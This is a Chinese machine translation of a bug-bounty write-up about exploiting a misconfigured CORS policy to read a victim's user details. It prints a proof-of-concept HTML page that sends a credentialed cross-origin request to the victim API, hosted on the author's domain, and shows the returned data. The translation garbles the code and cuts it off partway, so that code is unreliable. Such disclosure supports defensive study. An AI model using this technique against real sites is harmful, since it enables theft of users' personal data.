<html>
<head>
<title>Stealing User Details By Exploiting CORS</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用CORS窃取用户信息</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/stealing-user-details-by-exploiting-cors-c5ee86ebe7fb?source=collection_archive---------0-----------------------#2017-09-17">https://infosecwriteups.com/stealing-user-details-by-exploiting-cors-c5ee86ebe7fb?source=collection_archive---------0-----------------------#2017-09-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e9ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们从跨源资源共享开始。下面是CORS如何工作的图。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/819ef925afce652a6701fa4a2dcdbaad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/format:webp/1*Qu56zOpntpK6BBE69ckL7Q.png"/></div></figure><p id="2f33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在一个私人网站上搜索，在内容发现的时候我注意到每一个请求和响应，那时我注意到应用程序在请求中使用了“Origin”头。<br/> <br/>现在什么是原点头？</p><p id="c771" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来源请求标头指示提取的来源。它不包含任何路径信息，只包含服务器名称。它与CORS请求以及POST请求一起发送。</p><p id="d064" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我用我的域名和路径替换了Origin头的值，其中包含了利用cors的代码。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi kt"><img src="../Images/79d498b215c9b8c5541bfcce7fdedbb5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iQ6sKSqS20wVi3rP5-FKVA.png"/></div></div></figure><p id="f298" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">cors.html是利用错误配置的CORS的漏洞代码。<br/>漏洞代码如下。</p><p id="8043" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><br/>&lt;html&gt;<br/>&lt;head&gt;<br/>&lt;script&gt;<br/>function CORS(){<br/>var xhttp = new XMLHttpRequest()；<br/>xhttp . onreadystatechange = function(){<br/>if(this . ready state = = 4&amp;&amp;this . status = = 200){<br/>document . getelementbyid(" demo ")。innerHTML = alert(this . responsetext)；<br/>}<br/>}；<br/> xhttp.open("GET "，"<a class="ae ky" href="https://hackerone.com/redirect?signature=de95f7e56ca1fed87abd5c52033bb1e1768241db&amp;url=https%3A%2F%2Fmanage.gusto.com%2Fapi%2Fuser%3Fversion%3Dshow_with_logins" rel="noopener ugc nofollow" target="_blank">https://www.victim.com/api/user?version=show_with_logins</a>"，true)；<br/>xhttp . with credentials = true；<br/>xhttp . send()；<br/>}&lt;/脚本&gt;&lt;/头部&gt;<br/>&lt;body onload = " CORS()"&gt;<br/>&lt;中心&gt;<br/>&lt;H2&gt;CORS POC Exploit arman&lt;/H2&gt;<br/>&lt;H3&gt;提取SID&lt;/H3&gt;&lt;div id = " demo "&gt;<br/>&lt;button type = " button</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi kz"><img src="../Images/e38816e03bb34e54a26a586d4b0295ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EQSd1d0H_gjJMXT6cYy9Kw.png"/></div></div></figure><p id="e83e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如你在截图中看到的</p><p id="8666" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问控制允许来源:http://www.armaanpathan.pe.hu/cors.html<br/>访问控制允许凭证:真</p><p id="6dfa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这使得我/攻击者能够窃取受害者的个人信息/用户详细信息</p><p id="24ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在这之后，我在浏览器中打开了<a class="ae ky" href="http://www.armaanpathan.pe.hu/cors.html" rel="noopener ugc nofollow" target="_blank">http://www.armaanpathan.pe.hu/cors.html</a>,看看我是否能够获取用户的详细信息。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi la"><img src="../Images/c34b12b8f110f5cdc1f7332263e9b78b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jf3yC2tSCYZiET1xRwHT1Q.png"/></div></div></figure><p id="2de6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我点击exploited并检查网络控制台时</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi lb"><img src="../Images/9a891eec669ef6603418dc1dcb150f4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wc2nWS99qQcYEVcpbW-CRQ.png"/></div></div></figure><p id="787b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该漏洞代码正在抓取的信息，如用户名，电子邮件地址，电话号码，用户角色和其他敏感信息。</p><p id="4f68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢阅读。我希望你们都喜欢这个，</p><p id="4711" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参考</p><p id="c91f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">geek boy . ninja/blog/exploining-错误配置-CORS-跨源-资源共享/</p></div></div>    
</body>
</html>